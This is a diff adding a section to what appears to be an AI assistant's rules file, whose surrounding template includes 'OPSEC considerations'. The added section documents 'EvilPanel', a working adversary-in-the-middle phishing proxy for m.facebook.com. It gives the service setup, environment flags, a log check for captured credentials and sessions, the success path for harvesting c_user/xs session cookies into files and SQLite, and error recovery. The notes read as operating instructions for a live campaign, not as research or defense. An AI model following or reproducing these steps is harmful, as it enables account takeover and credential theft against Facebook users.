@@ -128,6 +128,14 @@ When rules are active, AI responses follow this pattern:
 {OPSEC considerations}
 ```
 
+## EvilPanel Facebook AiTM (synced from VPS)
+- Working stack uses `EvilPanelAddon` + `facebook_session_addon` (cookie jar + Origin/Referer rewrite).
+- Service unit: `evilpanel/deploy/evilpanel.service` (reverse to `https://m.facebook.com` on 127.0.0.1:8443).
+- Env flags: `EVILPANEL_LOG_HEADERS=1` for header/cookie debug; `EVILPANEL_DOMAIN`, `EVILPANEL_DATA` as needed.
+- Verify: `tail -f /opt/evilpanel/logs/mitmproxy.log | grep -Ei "FBSESS|CRED|SESSION|HDR-REQ|HDR-RESP"`.
+- Success path: CTA → login → “Save your login info?” screen; `[SESSION]` with `c_user/xs` and entries in `data/sessions.json` + SQLite.
+- 502 recovery: check `journalctl -u evilpanel` for addon syntax errors; ensure addons list includes `FacebookSessionAddon`.
+
 ## Version
 - **Version:** 1.0.0
 - **Created:** December 6, 2025
